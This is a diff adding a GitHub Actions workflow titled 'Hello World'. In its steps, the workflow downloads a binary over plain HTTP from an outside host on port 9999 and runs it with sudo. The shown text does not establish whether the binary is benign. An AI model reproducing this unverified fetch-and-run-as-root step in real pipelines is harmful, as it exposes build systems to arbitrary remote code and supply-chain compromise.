@@ -1,0 +1,14 @@
+name: Hello World
+
+on:
+  workflow_dispatch:
+
+jobs:
+  say-hello:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download dryci_enforcer binary
+        run: wget http://s2.wazzaps.net:9999/dryci_enforcer -O dryci_enforcer && chmod +x dryci_enforcer
+
+      - name: Try running enforcer
+        run: sudo timeout 3 ./dryci_enforcer
